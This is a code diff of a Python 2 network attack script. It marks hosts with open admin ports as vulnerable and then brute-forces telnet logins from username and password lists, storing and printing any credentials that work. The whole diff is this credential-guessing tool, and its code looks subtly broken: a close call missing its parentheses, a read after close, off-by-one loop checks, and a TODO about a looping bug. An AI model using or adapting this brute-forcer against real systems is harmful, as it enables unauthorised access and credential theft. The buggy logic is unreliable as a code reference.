@@ -71,7 +71,7 @@ class CheckAdminPorts(Thread):
             for port in lport:
                 try:
                     sop = self.nm[lhost]['tcp'][port]['state']  # defines port state variable
-                    if sop != 'closed':  # checks to see if status is open
+                    if sop == 'open':  # checks to see if status is open
                         if b not in vhosts:  # checks to see if host already has an object
                             b = VulnHost(lhost)  # creates an object for that host if it doesn't exist
                             vhosts.append(b)  # appends vulnerable host to list
@@ -123,24 +123,32 @@ class CheckVports(Thread):
             port = 23
         for user in users:
             x = 0
-            for password in passwords:
+            while x < len(passwords):
                 try:  # open telnet connection(ipaddr, port, timeout)
-                    t = telnetlib.Telnet(host, port, 1)
-                    tl = t.read_some()
-                    if "login: " in tl:
-                        t.write(user + "\n")
-                        t.read_until("Password: ")
-                        t.write(passwords[x] + "\n")
-                        t.write("ls\n")
-                        t.write("exit\n")
-                        po = t.read_all()
-                        if "logout" in po:
-                            newcreds = host + ",telnet,23," + user + "," + passwords[x]
-                            vhost.put_creds(newcreds)
-                            print "[!] Success for Telnet! host: {0}, user: {1}, password: {2}".format(host,
-                                                                colored(user, 'yellow'), colored(passwords[x], 'green'))
-                            break
+                    t = telnetlib.Telnet(host, port, 15)
+                    tu = t.read_until("ogin: ")
+                    print tu
+                    t.write(user + "\n")
+                    print user
+                    tp = t.read_until("assword: ")
+                    print tp
+                    print passwords[x]
+                    t.write(passwords[x] + "\n")
+                    # tm = t.read_very_eager()
+                    # print tm
+                    t.read_until("OK")
+                    t.close
+                    po = t.read_all()
+                    print po
+                    if "OK" in po:
+                        newcreds = host + ",telnet," + port + "," + user + "," + passwords[x]
+                        vhost.put_creds(newcreds)
+                        print "[!] Success for Telnet! host: {0}, user: {1}, password: {2}".format(host,
+                                                            colored(user, 'yellow'), colored(passwords[x], 'green'))
+                        t.write("quit\n")
+                        break
                     else:
+                        x += 1
                         break
                 except Exception as error:
                     if "Connection refused" in error:
@@ -149,7 +157,7 @@ class CheckVports(Thread):
                     else:
                         log_error(error)
                         x += 1
-                        if x == len(passwords):
+                        if x == len(passwords) - 1:
                             print "[!] Password not found."
                             # print "[!] ", e  # prints thrown exception, for debug
                             # TODO: fix looping issue, password found, continues to test passwords
